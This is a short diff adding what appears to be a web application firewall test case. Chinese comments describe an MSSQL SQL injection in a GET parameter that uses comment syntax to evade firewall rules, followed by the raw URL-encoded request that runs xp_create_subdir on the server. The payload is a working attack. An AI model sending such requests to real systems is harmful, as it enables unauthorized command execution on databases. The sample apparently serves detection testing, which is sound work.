@@ -1,0 +1,10 @@
+# SQL注入_GET_mssql_普通注入(注释绕过)-06506461
+# 攻击者基于注释绕过手法的查询，将"1--/*
+# exec xp_create_subdir 'c:/text'-- */"语句注入到 SQL 查询参数中，使用注释符号绕过防火墙规则的检测，以达到可以在C盘下创建任意文件夹的目的。
+GET /?id=1--%2F%2A%0Aexec%20xp_create_subdir%20%27c:%2Ftext%27--%20%2A%2F&bid=hd_tag_m8mv26m2 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26m2
+RM-PRO-Token: 2dc2ff87c6533661fef631cd92cd6d99
+RM-PRO-Time: 1742808634851
+User-Agent: curl/7.83.1
+
